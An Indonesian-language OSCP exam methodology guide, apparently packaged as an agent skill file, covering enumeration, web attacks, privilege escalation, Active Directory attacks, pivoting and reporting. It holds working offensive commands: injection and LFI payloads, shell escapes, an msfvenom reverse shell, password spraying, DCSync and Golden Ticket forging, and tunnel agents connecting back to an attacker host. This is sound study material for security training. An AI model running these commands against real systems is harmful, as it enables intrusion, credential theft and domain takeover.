---
name: oscp-methodology
description: OSCP (Offensive Security Certified Professional) — mindset, metodologi, dan strategi komprehensif untuk PEN-200/OSCP+ mencakup filsafat Try Harder, 3 attack vectors, enumeration framework, privilege escalation AD/Linux/Windows, dan reporting.
license: MIT
compatibility: opencode
metadata:
  audience: penetration-testers
  workflow: exploitation
  source: offsec-pen-200
  standard: oscp
  year: "2026"
---

# OSCP — Metodologi & Pola Pikir

## Daftar Isi

1. [Filosofi OSCP — "Try Harder" Mindset](#1-filosofi-oscp--try-harder-mindset)
2. [OSCP+ Exam Architecture](#2-oscp-exam-architecture)
3. [Siklus Metodologi 3 Attack Vectors](#3-siklus-metodologi-3-attack-vectors)
4. [Reconnaissance & Enumeration Framework](#4-reconnaissance--enumeration-framework)
5. [Web Application Attacks](#5-web-application-attacks)
6. [Buffer Overflow Methodology](#6-buffer-overflow-methodology)
7. [Privilege Escalation — Linux](#7-privilege-escalation--linux)
8. [Privilege Escalation — Windows](#8-privilege-escalation--windows)
9. [Active Directory — Full Attack Chain](#9-active-directory--full-attack-chain)
10. [Pivoting & Lateral Movement](#10-pivoting--lateral-movement)
11. [Reporting Philosophy](#11-reporting-philosophy)
12. [Exam Strategy & Time Management](#12-exam-strategy--time-management)
13. [Password Cracking Methodology](#13-password-cracking-methodology)
14. [Referensi Lengkap](#14-referensi-lengkap)

---

## 1. Filosofi OSCP — "Try Harder" Mindset

OSCP bukan tentang tools. Tools berubah setiap tahun. OSCP adalah tentang **metodologi yang repeatable**, **pattern recognition**, dan **resourcefulness** saat menghadapi ketidakpastian.

### Prinsip Golden Rules

1. **Enumerate everything before exploiting anything** — 80% waktu harus dihabiskan untuk enumeration. Kebanyakan kegagalan bukan karena tidak bisa exploit, tapi karena melewatkan sesuatu saat enumeration.
2. **Every version number matters** — setiap versi service adalah potensi CVE. Searchsploit setiap versi yang ditemukan.
3. **Credentials found = try on ALL other services immediately** — password reuse adalah pattern paling reliable di exam.
4. **Stuck > 30 menit → re-enumerate, jangan gali rabbit hole** — jika 30 menit tidak ada progress, mundur, running ulang enumeration dengan perspektif baru.
5. **Document EVERY step as you go** — reproducibility adalah kunci poin di report. Screenshot semua langkah penting.
6. **Screenshots: IP + hostname + whoami/id + flag di frame yang SAMA** — OffSec strict tentang format bukti.
7. **Metasploit on ONE machine max** — simpan untuk machine yang paling susah.
8. **Breaks every 3-4 hours** — mandatory, not optional. Otak yang lelah membuat kesalahan.

### Pattern Recognition (Radiologist Model)

Cara terbaik untuk lulus OSCP adalah repetition sampai recognition menjadi otomatis. Radiolog melatih ribuan studi sampai abnormalities subtle langsung terlihat. OSCP sama: enumerate, exploit, escalate puluhan machine sampai pattern langsung terlihat.

Tapi pattern recognition saja tidak cukup. Anda juga butuh **repeatable process sistematis**: service berperilaku aneh? → check version → searchsploit → Google → check config → manual test. Ada proses sistematis di bawah intuisi.

### 3 Pertanyaan Kunci Saat Stuck

- Apa yang saya lewatkan?
- Sudahkah saya enumerate port non-standard?
- Sudahkah saya mencoba credentials yang ditemukan di service lain?

---

## 2. OSCP+ Exam Architecture

### Scoring (OSCP+ 2024+)

| Komponen | Poin | Detail |
|----------|------|--------|
| AD Set (3 machines) | 40 pts (10+10+20) | Assumed breach: mulai dengan domain user credentials |
| Standalone 1 | 20 pts (10 local + 10 proof) | Initial access + privilege escalation |
| Standalone 2 | 20 pts (10 local + 10 proof) | Initial access + privilege escalation |
| Standalone 3 | 20 pts (10 local + 10 proof) | Initial access + privilege escalation |
| **Passing** | **70/100** | Kombinasi partial credit dimungkinkan |

### Passing Combinations

- 40 pts (AD full) + 3 local.txt flags = 70 pts
- 40 pts (AD full) + 2 local + 1 proof = 70 pts
- 20 pts (AD partial) + 3 local + 2 proof = 70 pts
- 10 pts (AD partial) + 3 standalone full = 70 pts

### Restrictions

- **Metasploit**: hanya boleh digunakan di SATU target. Auxiliary modules (scanner, fuzzer) tidak dihitung sebagai Metasploit restriction.
- **AI Chatbots**: DILARANG (ChatGPT, YouChat, OffSec KAI, dll)
- **Commercial tools**: Burp Pro, Metasploit Pro, Nessus, OpenVAS — DILARANG
- **Automatic exploitation**: sqlmap, db_autopwn, browser_autopwn — DILARANG
- **Allowed**: Nmap, NSE scripts, Nikto, Burp Community, DirBuster, Feroxbuster, ffuf, manual tooling

### Exam Timeline

- **23 hours 45 minutes**: Hacking phase
- **24 hours**: Report submission window
- Format report: PDF via .7z, upload ke upload.offsec.com
- Nama file: `OSCP-OS-XXXXX-Exam-Report.7z`

### Machine Reverts

Setiap machine bisa direvert. Jumlah revert terbatas. Gunakan revert dengan bijak — terutama saat OS crash akibat kernel exploit gagal.

---

## 3. Siklus Metodologi 3 Attack Vectors

OSCP menggunakan siklus berulang yang diterapkan di setiap fase (initial access, privilege escalation, AD):

```
Enumerate 3 Vectors → Analyze → Prioritize → Attack → Escalate Pivot
                                                          ↓
                                              Re-Enumerate 3 Vectors
                                                          ↓
                                              Repeat until root/DA
```

### 3 Attack Vectors

#### A. Vulnerable Versions
Service version diketahui → cari public exploit:
- `searchsploit service_name version`
- Google CVE database
- GitHub PoC
- Adaptasi exploit: ganti IP, port, shellcode, offset

**Mindset**: Setiap versi adalah potensi CVE. Versi lawas (Apache 2.4.49, OpenSSL, SMBv1) sering punya public exploit.

#### B. Misconfigurations
Service yang salah konfigurasi:
- Default credentials (admin:admin, root:toor)
- Anonymous FTP, SMB null session
- Directory listing enabled
- Weak file permissions
- Sudo misconfiguration (NOPASSWD, LD_PRELOAD)
- SUID/SGID pada binary custom
- Unquoted service paths (Windows)
- AlwaysInstallElevated (Windows)
- Token privileges (SeImpersonate, SeBackup, SeDebug)

**Mindset**: Misconfigurations lebih reliable daripada kernel exploit. Cek ini dulu.

#### C. Sensitive Information
Informasi tersembunyi di config files, source code, backup, history:
- Database credentials di file config (wp-config.php, .env, config.php)
- SSH keys world-readable
- Bash/PowerShell history
- Backup files (*.bak, *.old, ~)
- Source code comments
- Hardcoded API keys/tokens
- Registry entries (Windows)
- Browser saved credentials
- Unattended installation files (unattend.xml, autounattend.xml)

**Mindset**: Credentials adalah emas. Setiap credential yang ditemukan harus segera dicoba di SEMUA service lain (SSH, SMB, WinRM, web admin, database, domain services).

---

## 4. Reconnaissance & Enumeration Framework

### Nmap Workflow Optimal

```bash
# Step 1: Fast full port scan (jangan tunggu)
nmap -Pn -p- --min-rate 10000 -T4 $IP -oA nmap/allports

# Step 2: Service version + default scripts
nmap -Pn -sC -sV -p $PORTS $IP -oA nmap/services
```

TTL adalah hint, bukan bukti: TTL ~64 = Linux; TTL ~128 = Windows.

### Service Enumeration per Port

Setiap open port harus mendapat enumeration terstruktur:

| Port | Service | Enumeration Checklist |
|------|---------|----------------------|
| 21 | FTP | Anonymous login? Version exploits? Writable directory? |
| 22 | SSH | Version exploits? Default creds? Key-based auth? |
| 25 | SMTP | User enumeration (VRFY, EXPN)? Open relay? |
| 53 | DNS | Zone transfer? Subdomain enumeration? |
| 80/443 | HTTP/S | Web app full checklist (lihat section 5) |
| 139/445 | SMB | Null session? Share listing? Version exploits (EternalBlue)? |
| 389/636 | LDAP | Anonymous bind? Dump domain info? |
| 161 | SNMP | Public community string? Windows service enumeration? |
| 2049 | NFS | Showmount -e? no_root_squash? |
| 3306 | MySQL | Root login? Version exploits? |
| 3389 | RDP | Version? BlueKeep? Creds reuse? |
| 5985/5986 | WinRM | Credentialed access? Evil-WinRM? |
| 6379 | Redis | No-auth access? RCE via cron/SSH key? |
| 8080 | HTTP-alt | Same as 80/443 |
| 27017 | MongoDB | No-auth access? Data dump? |

### Enumeration Mindset

- **Jangan hanya scan port umum** — service kritis sering berjalan di high ports
- **Simpan output** — selama exam, Anda perlu bukti di report. `-oA` adalah penyelamat.
- **Credential stuffing** — setiap credential langsung di-test ke semua service
- **Re-enumerate setelah dapat akses** — running services, listening ports, network interfaces dari dalam bisa reveal attack path baru

---

## 5. Web Application Attacks

### Attack Roadmap

```
Target URL
  ├── RECON: whatweb → headers → tech stack
  ├── ENUMERATE: ffuf/feroxbuster → dirs → files → params
  │     ├── JS files → endpoints → secrets
  │     ├── robots.txt → hidden paths
  │     └── Source code → comments → credentials
  ├── ATTACK SURFACE:
  │     ├── INPUT FIELDS
  │     │     ├── SQLi: ' OR 1=1 → UNION → data extraction
  │     │     ├── SSTI: {{7*7}} → RCE
  │     │     ├── XSS: <script> → stored/reflected/DOM
  │     │     ├── CMDi: ; whoami → reverse shell
  │     │     ├── LFI: ../../etc/passwd → log poisoning → RCE
  │     │     └── XXE: file read / SSRF
  │     ├── ACCESS CONTROL
  │     │     ├── IDOR: ubah id parameter
  │     │     └── SSRF: internal port scan → cloud metadata
  │     └── FILE UPLOAD
  │           ├── Extension bypass: .php disguised
  │           ├── MIME bypass: Content-Type manipulation
  │           └── Webshell → RCE
  └── POST-EXPLOIT: extract creds from DB → config files → pivot
```

### LFI to RCE

LFI adalah salah satu entry vector paling umum di OSCP:

1. **Buktikan file read**: `../../etc/passwd`
2. **Log poisoning**: inject PHP code di User-Agent → include access.log
3. **PHP wrappers**: `php://filter/convert.base64-encode/resource=config.php`
4. **Proc enumeration**: `/proc/self/environ`, `/proc/PID/cmdline`

### SQL Injection Mindset

SQLMap dilarang di exam. Anda harus bisa manual:
1. **Deteksi**: `' OR 1=1--`, `' AND SLEEP(5)--`
2. **UNION-based**: tentukan jumlah columns, extract data
3. **Blind SQLi**: time-based, boolean-based
4. **File read/write** (MySQL): `LOAD_FILE()`, `INTO OUTFILE`
5. **MSSQL**: `xp_cmdshell` untuk RCE jika punya privileges cukup

### Command Injection

- **Detection**: `; whoami`, `| whoami`, `$(whoami)`, `` `whoami` ``
- **Blind**: `; sleep 5`, `| ping -c 10 $IP`
- **Exploitation**: reverse shell, webshell write

---

## 6. Buffer Overflow Methodology

BOF tidak lagi dijamin ada di exam OSCP+ (sejak 2023), tapi tetap mungkin muncul. Metodologi ini harus bisa dieksekusi dalam < 30 menit jika BOF muncul.

### 7-Step Workflow (x86 Windows)

1. **Fuzzing**: Kirim string panjang bertahap → trigger crash → catat byte count
2. **Find EIP Offset**: `msf-pattern_create` + `msf-pattern_offset` → temukan offset exact
3. **Confirm EIP Control**: Offset A's + "BBBB" → verifikasi EIP = 0x42424242
4. **Find Bad Characters**: Kirim semua byte (\x00-\xff) kecuali \x00 → bandingkan dengan mona bytearray
5. **Find JMP ESP**: `!mona jmp -r esp -cpb "\x00..."` → dapatkan address tanpa badchars
6. **Generate Shellcode**: `msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=$PORT -b "\x00..." -f py`
7. **Exploit**: Offset + JMP ESP + NOPs + shellcode → catch shell

### Tools Required

- Immunity Debugger + mona.py
- `msf-pattern_create` / `msf-pattern_offset` (Kali)
- `msfvenom` (Kali)
- Python socket scripting

### Key Points

- **Little endian**: address JMP ESP harus dibalik byte-nya saat dimasukkan ke script
- **NOP sled**: 16-32 bytes \x90 sebelum shellcode
- **Bad chars**: \x00 selalu bad. Cari bad chars lain dengan mona compare.
- **ASLR/DEP bypass**: cari module tanpa proteksi (gunakan `!mona modules`)

---

## 7. Privilege Escalation — Linux

### Enumerasi Prioritas (dari yang paling sering berhasil)

```
1. sudo -l                    # NOPASSWD, LD_PRELOAD, binary abuse (GTFOBins)
2. find / -perm -u=s          # SUID/SGID binaries
3. getcap -r / 2>/dev/null    # Linux capabilities
4. pspy64                     # Cron jobs & scheduled tasks
5. grep -r "password" /       # Credential hunting
6. netstat -antup             # Internal listening ports
7. Kernel exploit             # LAST RESORT
```

### Pola Pikir Linux Privesc

> **Kernel exploit adalah LAST RESORT.** Jangan gunakan kernel exploit sebelum semua pattern di atas habis. Kernel exploit bisa crash target, memaksa revert, dan menghabiskan waktu.

#### Sudo Abuse (Vector #1)

```bash
# Cek sudo permissions
sudo -l
# Jika ada binary tanpa password → cek GTFOBins
# Jika LD_PRELOAD di env_keep → kompilasi shared library
```

Mental checklist:
- `sudo -l` menunjukkan binary dengan NOPASSWD? Cek GTFOBins untuk shell escape.
- Binary bisa membaca/menulis file? `/etc/shadow`, `/etc/sudoers` overwrite?
- Ada `env_keep+=LD_PRELOAD`? Kompilasi .so yang spawn root shell.

#### SUID/SGID (Vector #2)

```bash
find / -perm -u=s -type f 2>/dev/null
```

Ignore standard binaries (ping, su, mount, passwd). Cari anomalies:
- `/usr/bin/find` → `find . -exec /bin/sh -p \;`
- `/usr/bin/cp` → overwrite /etc/passwd
- `/usr/bin/systemctl` → instant root
- `/opt/custom_binary` → custom binary dengan SUID

#### Capabilities (Vector #3)

```bash
getcap -r / 2>/dev/null
```

- `cap_setuid+ep` pada Python → `python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'`
- `cap_dac_override` → bisa baca file restricted

#### Cron Jobs (Vector #4)

```bash
# Upload pspy64 untuk monitor processes
./pspy64
```

Cari:
- Script berjalan sebagai root tiap X menit
- Script ada di writable path → replace dengan reverse shell
- Script menggunakan relative path → PATH hijacking

#### Credential Hunting (Vector #5)

```bash
grep -r "password" /var/www/ 2>/dev/null
grep -r "DB_PASS" /var/www/ 2>/dev/null
cat /var/www/html/wp-config.php
find / -name id_rsa 2>/dev/null
```

Setiap password yang ditemukan → coba `su root`, SSH ke localhost, SMB, database.

#### Internal Ports (Vector #6)

```bash
netstat -antup | grep LISTEN
ss -antup
```

Service di localhost (127.0.0.1) yang jalan sebagai root bisa diakses via SSH tunneling: MySQL, Redis, Jenkins, custom apps.

#### Kernel Exploit (Vector #7 — LAST RESORT)

```bash
uname -r
searchsploit kernel_version
```

Hanya jika semua pattern di atas gagal. Pastikan exploit stabil dan sesuai kernel version.

---

## 8. Privilege Escalation — Windows

### Enumerasi Prioritas

```
1. whoami /all              # Tokens & group memberships
2. systeminfo               # OS version, patches, hotfixes
3. wmic qfe get Caption     # Installed patches
4. WinPEAS                  # Automated enumeration
5. cmdkey /list             # Stored credentials
6. netstat -ano             # Listening ports
```

### Pola Pikir Windows Privesc

#### Token Abuse — SeImpersonatePrivilege (Vector #1)

Jika `whoami /priv` menunjukkan **SeImpersonatePrivilege** atau **SeAssignPrimaryTokenPrivilege**:
- Gunakan Potato family (GodPotato, PrintSpoofer, SweetPotato, JuicyPotato)
- Biasanya dimiliki oleh service accounts (IIS, MSSQL)
- Instant SYSTEM level access

Cek juga: SeBackupPrivilege, SeRestorePrivilege, SeDebugPrivilege, SeTakeOwnershipPrivilege

#### Service Misconfigurations (Vector #2)

```powershell
# PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1; Invoke-AllChecks

# Manual checks
wmic service get name,displayname,pathname,startmode | findstr /i "auto"
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
```

Tiga jenis misconfig:
1. **Unquoted Service Path**: path mengandung spasi tanpa quotes → jika writable, tempatkan executable
2. **Writable Service Binary**: service binary bisa di-overwrite
3. **Weak Service Permissions**: service bisa dimodifikasi oleh low-privileged user

#### AlwaysInstallElevated (Vector #3)

```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Jika keduanya = 1 → buat MSI payload → jalankan → SYSTEM shell.

#### Credential Hunting (Vector #4)

- **LSASS dump**: procdump, Task Manager, Mimikatz (tapi hati-hati dengan AV)
- **SAM & SYSTEM hives**: `reg save HKLM\SAM sam.save`, `reg save HKLM\SYSTEM system.save`
- **Unattended install files**: C:\Windows\Panther\unattend.xml, autounattend.xml
- **PowerShell history**: `(Get-PSReadLineOption).HistorySavePath`
- **Registry AutoLogon**: `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"`
- **Browser saved passwords**: LaZagne, SharpChrome

#### Scheduled Tasks (Vector #5)

```powershell
schtasks /query /fo LIST /v
Get-ScheduledTask | Get-ScheduledTaskInfo
```

Cari task yang berjalan dengan privilege tinggi dan merujuk ke binary di writable path.

#### Startup Applications (Vector #6)

```powershell
wmic startup get caption,command
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

---

## 9. Active Directory — Full Attack Chain

### Assumed Breach Mindset

OSCP+ AD set dimulai dengan **assumed breach**: Anda diberi satu standard domain user credentials. Pertanyaan pertama bukan "bagaimana dapat user?" tapi "**apa yang bisa user ini akses, lihat, dan pengaruhi?**"

### AD Attack Chain Framework

```
Credentials → Enumerate Domain → Kerberoast/AS-REP → Lateral Movement 
→ ACL/Delegation/ADCS Abuse → Domain Admin → DCSync
```

### Fase 1: Domain Enumeration

```bash
# User enumeration via Kerberos
kerbrute userenum -d DOMAIN.LOCAL --dc $DC users.txt

# BloodHound collection
bloodhound-python -d DOMAIN.LOCAL -u USER -p PASS -dc $DC -c All

# SMB enumeration
netexec smb $DC -u USER -p PASS --users
netexec smb $DC -u USER -p PASS --groups

# LDAP enumeration
ldapsearch -x -H ldap://$DC -D "DOMAIN\USER" -w PASS -b "DC=DOMAIN,DC=LOCAL"
```

**Mindset**: Enumeration adalah 80% dari AD attack. BloodHound adalah peta Anda. Jalankan `-c All` untuk mendapatkan full picture.

### Fase 2: Kerberos Attacks

#### AS-REP Roasting
User dengan **DONT_REQ_PREAUTH** → dapat TGT encrypt → crack offline:
```bash
impacket-GetNPUsers DOMAIN.LOCAL/USER:PASS -request
```

#### Kerberoasting
Minta TGS untuk service accounts → crack offline:
```bash
impacket-GetUserSPNs DOMAIN.LOCAL/USER:PASS -request
```

#### Password Spraying
Satu password untuk banyak users — hati-hati dengan lockout policy:
```bash
netexec smb $DC -u users.txt -p 'Password1' --continue-on-success
```

### Fase 3: AD Certificate Services (AD CS)

AD CS attack adalah salah satu high-impact path di OSCP. Berdasarkan SpecterOps "Certified Pre-Owned":

| ESC | Attack | Prerequisite |
|-----|--------|-------------|
| ESC1 | Template dengan SAN specification + Client Auth EKU | EnrolleeSuppliesSubject enabled |
| ESC2 | Any Purpose EKU atau No EKU | Low-privileged can enroll |
| ESC3 | Enrollment Agent abuse | Certificate Request Agent EKU |
| ESC4 | Template ACL write access | WriteProperty/WriteDACL on template |
| ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 on CA | CA flag misconfiguration |
| ESC7 | ManageCA/ManageCertificates on CA | CA permission misconfiguration |
| ESC8 | NTLM relay ke AD CS HTTP endpoint | Web enrollment tanpa EPA/HTTPS |

Tools: Certipy (Python), Certify (C#).

**Pola pikir**: AD CS adalah goldmine. Jika ada AD CS di environment, prioritaskan enumerasi ini.

### Fase 4: Delegation Abuse

| Type | Exploitation |
|------|-------------|
| **Unconstrained Delegation** | Compromise server → extract TGTs dari memory |
| **Constrained Delegation** | Ekstensi S4U2Self/S4U2Proxy → impersonate user |
| **RBCD** | Abuse `msDS-AllowedToActOnBehalfOfOtherIdentity` |

### Fase 5: ACL Abuse

Beberapa ACL yang bisa membawa ke DA:
- **GenericAll/WriteDACL** on user → Shadow Credentials, change password
- **GenericAll on group** → add yourself to Domain Admins
- **WriteDACL on domain root** → DCSync rights
- **ForceChangePassword** on privileged user
- **ReadGMSAPassword** → retrieve gMSA credentials
- **WriteOwner/WriteProperty** on certificate template → ESC4

### Fase 6: Domain Dominance

#### DCSync
Jika memiliki Replicating Directory Changes rights → dump semua hash:
```bash
impacket-secretsdump DOMAIN/USER:PASS@$DC
```

#### Golden Ticket
Know krbtgt hash → forge TGT for any user:
```bash
impacket-ticketer -nthash $KRBTGT_HASH -domain-sid $DOMAIN_SID -domain DOMAIN.LOCAL Administrator
```

#### Silver Ticket
Know service account hash → forge TGS for specific service.

---

## 10. Pivoting & Lateral Movement

### Decision Tree

```
Got shell on pivot machine?
        │
        ▼
Does pivot have SSH?
  ├── YES ──► SSH Tunneling (local/remote/dynamic)
  └── NO
        │
        ▼
  Firewall blocks all but HTTP/80?
  ├── YES ──► Chisel (HTTP tunnel via SOCKS)
  └── NO
        │
        ▼
  Need full network access?
  ├── YES ──► Ligolo-ng (TUN interface, acts like VPN)
  └── NO
        │
        ▼
  Quick single-port redirect?
  └────────► SOCAT
```

### Ligolo-ng (Recommended — TUN-based)

**Kenapa Ligolo-ng?** Membuat TUN interface di Kali → semua tool bisa langsung jalan tanpa proxychains. Nmap, responder, impacket — semua native support.

```bash
# Setup di Kali
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
sudo ./proxy -selfcert

# Di target
./agent -connect $KALI_IP:11601 -ignore-cert

# Di console Ligolo → session → ifconfig → lihat subnet
# Add route
sudo ip route add $SUBNET dev ligolo
# Start tunnel
start
```

### Chisel (SOCKS — app-by-app)

**Kenapa Chisel?** Cocok untuk web-heavy workflow, bisa HTTP tunnel melewati firewall, binary single-file.

```bash
# Di Kali
./chisel server -p 8000 --reverse --socks5

# Di target
./chisel client $KALI_IP:8000 R:socks

# /etc/proxychains4.conf → socks5 127.0.0.1 1080
# Gunakan dengan: proxychains4 nmap -sT -Pn $TARGET
```

### Pivoting Mindset

- Foothold didapat → langsung cek interfaces (`ip addr`, `ifconfig`)
- Setiap interface baru adalah subnet potensial
- Enumeration melalui pivot lebih lambat → prioritaskan service yang dikenal
- Double pivot: dari satu pivot, deploy agent ke deep network → route tambahan

---

## 11. Reporting Philosophy

> **Report yang buruk adalah penyebab kegagalan OSCP yang paling underrated.** Anda bisa compromise semua systems tapi dapat 0 poin karena screenshot kurang atau steps tidak reproducible.

### Golden Rules Report

1. **Reproducibility**: Setiap langkah harus bisa direproduksi oleh pembaca. Sertakan exact commands, output, dan reasoning.
2. **Screenshot di setiap langkah kritis**: scan results, exploit execution, shell access, privilege escalation, proof files.
3. **Format screenshot**: IP address + flag content (cat/type) di TERMINAL INTERAKTIF — bukan lewat web browser.
4. **Modified exploit code**: sertakan URL exploit original + perubahan yang dibuat + alasan perubahan.

### Struktur Report (OffSec Format)

1. **Executive Summary** (150-200 words) — deskripsi engagement, scope, high-level findings
2. **Methodology Overview** — pendekatan sistematis yang digunakan
3. **Detailed Findings** — per target, dengan sub-section:
   - Port scan results
   - Service enumeration
   - Vulnerability identification
   - Exploitation steps
   - Privilege escalation
   - Proof screenshots
4. **Appendices**: shellcode, code listings, referensi

### Report Templates (Open Source)

- [whoisflynn/OSCP-Exam-Report-Template](https://github.com/whoisflynn/OSCP-Exam-Report-Template) — Word template, gold standard komunitas
- [noraj/OSCP-Exam-Report-Template-Markdown](https://github.com/ret2src/OSCP-Exam-Report-Template-Markdown) — Markdown + Pandoc + LaTeX pipeline
- [PlatyPew/OSCP-Report-Generator](https://github.com/PlatyPew/OSCP-Report-Generator) — One-command PDF generation

### Naming Convention

- File: `OSCP-OS-XXXXX-Exam-Report.pdf`
- Archive: `OSCP-OS-XXXXX-Exam-Report.7z` (max 200MB, NO password)
- Upload via: https://upload.offsec.com

---

## 12. Exam Strategy & Time Management

### 23h45m Operating Plan

| Time Block | Activity |
|------------|----------|
| 00:00 - 00:30 | Parallel scans on ALL machines (nmap -p- on all IPs) |
| 00:30 - 03:30 | Attack AD set (highest ROI — 40 pts) |
| 03:30 - 08:00 | Continue AD + start standalone machines |
| 08:00 - 12:00 | Push hard on highest-confidence standalone |
| 12:00 - 16:00 | Pivot, privesc, second-order enumeration |
| 16:00 - 20:00 | Convert partials into proofs |
| 20:00 - 22:30 | Final exploitation attempts |
| 22:30 - 23:45 | Verify flags, screenshots, notes, report outline |
| 23:45 - next day | REPORT WRITING (24h window) |

### Golden Strategy Rules

1. **AD set first** — 40 points adalah blok terbesar. Jika selesai, Anda hanya butuh 30 pts dari standalones.
2. **Enumerate ALL machines in parallel** — jangan sequential. Scan semua IP di 30 menit pertama.
3. **The 30-minute rule**: jika stuck 30 menit di satu vector → move on, re-enumerate, coba pendekatan lain.
4. **Strategic retreat beats stubbornness**: walk away dari machine yang tidak progress → kerjakan yang lain → balik lagi nanti.
5. **Sleep strategis**: 24 jam itu panjang. Tidur 1-2 jam setelah 12 jam bisa bikin fresh.
6. **Screenshot as you go**: jangan menumpuk screenshot di akhir — lupa, kelelahan, kehabisan waktu.
7. **One folder per target**: buat folder terpisah untuk setiap machine, simpan semua scan dan output.

### Exam Day Checklist

- [ ] VPN connected, tun0 interface up (`ip a show tun0`)
- [ ] Burp Suite running, proxy configured
- [ ] Note-taking app open (Obsidian/CherryTree)
- [ ] Terminal logging active (`script` command)
- [ ] Exam control panel open
- [ ] Screenshots folder organized per target
- [ ] Known good shells pre-generated
- [ ] Clock started — note exam end time
- [ ] Food, water, snacks ready
- [ ] Phone silent — no interruptions

---

## 13. Password Cracking Methodology

### Hash Identification

```bash
hashid hash.txt
hash-identifier
```

Atau lihat format prefix: `$1$` = MD5 crypt, `$5$` = SHA256 crypt, `$6$` = SHA512 crypt, `$2y$` = bcrypt.

### Attack Strategy (Layered)

| Layer | Strategy | Command |
|-------|----------|---------|
| 1 | Wordlist langsung | `hashcat -m 0 -a 0 hashes.txt rockyou.txt` |
| 2 | best64 rules | `-r /usr/share/hashcat/rules/best64.rule` |
| 3 | Hybrid wordlist+mask | `-a 6 rockyou.txt '?d?d'` |
| 4 | dive.rule / OneRuleToRuleThemAll | `-r dive.rule` |
| 5 | Mask attack | `-a 3 ?a?a?a?a?a?a?a` |

### Rule-Based Attack Mindset

Rules transform setiap word di wordlist sebelum di-hash. Satu rule `c $1$2$3` mengubah `password` menjadi `Password123`. Dengan best64 (64 rules), 14 juta kata rockyou menjadi 900 juta candidates — semua di RAM, tanpa extra disk space.

### Hashcat Modes for OSCP

| Hash Type | Mode (-m) |
|-----------|-----------|
| MD5 | 0 |
| SHA1 | 100 |
| SHA256 | 1400 |
| SHA512 | 1700 |
| NTLM | 1000 |
| NetNTLMv2 | 5600 |
| bcrypt | 3200 |
| SHA512crypt ($6$) | 1800 |
| Kerberos 5 TGS-REP | 13100 |
| AS-REP | 18200 |
| WPA/WPA2 | 22000 |

---

## 14. Referensi Lengkap

### Official Resources

| # | Resource | URL |
|---|----------|-----|
| 1 | OSCP+ Exam Guide | https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide |
| 2 | PEN-200 12-Week Learning Plan | https://help.offsec.com/hc/en-us/articles/15541765522196 |
| 3 | OffSec Blog — 9 OSCP Study Tips | https://www.offsec.com/blog/oscp-study-tips-to-help-you-succeed/ |
| 4 | OffSec Proving Grounds | https://www.offsec.com/labs/individual |

### Comprehensive Guides & Roadmaps

| # | Resource | URL |
|---|----------|-----|
| 5 | PlainlySec — How to Prepare 2026 | https://plainlysec.com/how-to-prepare-for-oscp-in-2026-tools-commands-resources-methodology/ |
| 6 | PlainlySec — OSCP+ 2026 Master Guide | https://plainlysec.com/oscp-plus-2026-ultimate-everything-included-master-guide/ |
| 7 | HackerDNA — OSCP+ Preparation 2026 | https://hackerdna.com/blog/oscp-preparation-guide |
| 8 | AceFortis — How to Pass 2026 | https://acefortis.com/2026/02/26/oscp-certification-guide-how-to-pass-2026/ |
| 9 | ExamCert — OSCP Complete Guide | https://www.examcert.app/blog/oscp-complete-guide/ |
| 10 | OSCP-Guide.com | https://oscp-guide.com/ |
| 11 | Jorkle's OSCP Guide (2025) | https://jorkle.com/posts/oscp-guide/ |
| 12 | Kioptrix — OSCP Roadmap | https://kioptrix.com/oscp-roadmap/ |
| 13 | Kioptrix — 30 Privesc Patterns | https://kioptrix.com/privilege-escalation-patterns-oscp/ |
| 14 | Kioptrix — Pivoting Tool Choice | https://kioptrix.com/oscp-pivoting-tool-choice/ |
| 15 | Decryption Digest — OSCP Study Guide | https://www.decryptiondigest.com/blog/oscp-certification-study-guide |
| 16 | Ethan Troy — OSCP Review 2026 | https://ethantroy.dev/guides/reviews/oscp/ |
| 17 | Ethical Hacking Institute — OSCP Prep | https://www.ethicalhackinginstitute.com/blog/how-to-prepare-for-oscp-certification-effectively |
| 18 | Ethical Hacking Institute — Best Study | https://www.ethicalhackinginstitute.com/blog/best-way-to-study-for-oscp-proven-strategies-study-plan |
| 19 | Schellman — Conquering the OSCP | https://www.schellman.com/blog/penetration-testing/conquering-the-oscp-self-study-tips-and-exam-tricks |
| 20 | Zero Space — Passed in 9 Hours | https://medium.com/@cyberXarmy/how-i-passed-oscp-in-9-hours-%EF%B8%8F-aeb6f66ee0b4 |
| 21 | DataDefender — OSCP+ as a Fresher | https://medium.com/@DataDefender/how-i-passed-oscp-as-a-fresher-a-practical-no-nonsense-journey-95040f1ecc57 |
| 22 | Adlurijanakivallabh — 90/100 Points | https://medium.com/@adlurijanakivallabh/how-i-passed-oscp-and-oscp-on-my-first-attempt-with-90-100-points-a842898f2532 |
| 23 | Anezaneo — OSCP Fail? Use TJ Null | https://infosecwriteups.com/oscp-fail-use-tj-null-list-htb-labs-to-pass-your-retake-ff08164ea23b |
| 24 | Red Team Guide — OSCP Review | https://redteamguide.com/certifications/oscp-review-2026/ |
| 25 | Hack with Mike — OSCP Methodology | https://hackwithmike.com/oscp/methodology |
| 26 | Zeyu's OSCP Writeups | https://pentesting.zeyu2001.com/ |
| 27 | PluralSight — OSCP Exam Prep | https://www.pluralsight.com/paths/offensive-security-professional-exam-prep |
| 28 | OSCP/eCPPTv3 Notes — All Modules | https://krovs.github.io/oscp-notes/ |
| 29 | OSCP Notes (aditya-3) | https://aditya-3.gitbook.io/oscp |
| 30 | OffSec Wiki — File Inclusion | https://offsec.pentest.tools/exploit/web/security-risk/file-inclusion/ |

### GitHub Repositories

| # | Repository | Deskripsi |
|---|------------|-----------|
| 31 | anupamjaiswall/OSCP-Checklist | Ultimate OSCP methodology checklist (Obsidian format) |
| 32 | verylazytech/OSCP-Resources | Comprehensive collection of OSCP resources |
| 33 | d37atm/awesome-oscp | Curated list of awesome OSCP resources |
